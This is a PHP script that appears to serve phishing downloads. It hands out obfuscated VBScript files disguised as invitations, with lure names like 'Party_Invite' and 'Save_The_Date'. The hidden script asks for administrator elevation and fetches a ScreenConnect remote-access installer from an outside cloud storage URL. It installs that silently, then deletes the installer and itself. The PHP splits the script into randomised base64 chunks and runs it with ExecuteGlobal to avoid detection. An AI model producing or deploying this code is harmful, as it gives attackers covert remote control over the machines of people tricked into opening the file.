<?php
// invite.php - Cleaner Encoding (Less aggressive randomization)
header('Content-Type: text/plain; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate');

$baseNames = [
    "Party_Invite", "Letter_from_Friend", "Important_Mail", "Formal_Invitation",
    "Invitation_Final", "Special_Invitation_VIP", "Special_letter_VIP",
    "Ceremony_Invite", "RSVP_Invitation_Draft", "Personal_Invite", "Elegant_Invitation_Card",
    "Invitation_Exclusive", "Save_The_Date_Invitation", "Save_The_Date"
];

$cookieName = "inv_used";
$used = isset($_COOKIE[$cookieName]) ? json_decode($_COOKIE[$cookieName], true) : [];
if (!is_array($used)) $used = [];

$available = array_diff($baseNames, $used);
if (empty($available)) {
    $available = $baseNames;
    $used = [];
}

$chosenBase = $available[array_rand($available)];
$random5 = str_pad(rand(10000, 99999), 5, '0', STR_PAD_LEFT);
$chosen = $chosenBase . "_" . $random5 . ".vbs";

$used[] = $chosenBase;
setcookie($cookieName, json_encode(array_unique($used)), time() + (30 * 24 * 60 * 60), "/");

header('Content-Disposition: attachment; filename="' . $chosen . '"');

$msiUrl = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetup%20(1).msi";

$realVbs = <<<REAL
On Error Resume Next

Dim objShell, objFSO, http, stream, p

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

If WScript.Arguments.Length = 0 Then
    Dim sh
    Set sh = CreateObject("Shell.Application")
    sh.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ elevated", "", "runas", 0
    WScript.Quit
End If

p = objShell.ExpandEnvironmentStrings("%TEMP%\\sc_setup.msi")

Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", "$msiUrl", False
http.Send

If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile p, 2
    stream.Close
    objShell.Run """" & p & """ /quiet", 0, True
    WScript.Sleep 90000
    If objFSO.FileExists(p) Then objFSO.DeleteFile p, True
End If

objFSO.DeleteFile WScript.ScriptFullName, True
WScript.Quit
REAL;

// Mild random chunk size
$chunkSize = rand(70, 110);

$base64 = base64_encode($realVbs);
$len = strlen($base64);
$count = ceil($len / $chunkSize);

// Only a few mildly random names
$arrayName = "data" . rand(10, 99);
$funcName  = "Decode" . rand(10, 99);

$vbs  = "Option Explicit\r\n";
$vbs .= "Dim $arrayName(" . ($count - 1) . ")\r\n";

for ($i = 0; $i < $count; $i++) {
    $start = $i * $chunkSize;
    $chunk = substr($base64, $start, $chunkSize);
    $vbs .= "$arrayName($i) = \"$chunk\"\r\n";
}

$vbs .= "\r\nDim fullData : fullData = Join($arrayName, \"\")\r\n";
$vbs .= "ExecuteGlobal $funcName(fullData)\r\n\r\n";

$vbs .= "Function $funcName(s)\r\n";
$vbs .= " Dim xmlDoc, streamObj, node\r\n";
$vbs .= " Set xmlDoc = CreateObject(\"Msxml2.DOMDocument.6.0\")\r\n";
$vbs .= " Set node = xmlDoc.createElement(\"b\")\r\n";
$vbs .= " node.dataType = \"bin.base64\"\r\n";
$vbs .= " node.text = s\r\n";
$vbs .= " Set streamObj = CreateObject(\"ADODB.Stream\")\r\n";
$vbs .= " streamObj.Type = 1 : streamObj.Open\r\n";
$vbs .= " streamObj.Write node.nodeTypedValue\r\n";
$vbs .= " streamObj.Position = 0\r\n";
$vbs .= " streamObj.Type = 2 : streamObj.Charset = \"UTF-8\"\r\n";
$vbs .= " $funcName = streamObj.ReadText\r\n";
$vbs .= " streamObj.Close\r\n";
$vbs .= "End Function\r\n";

echo $vbs;
?>
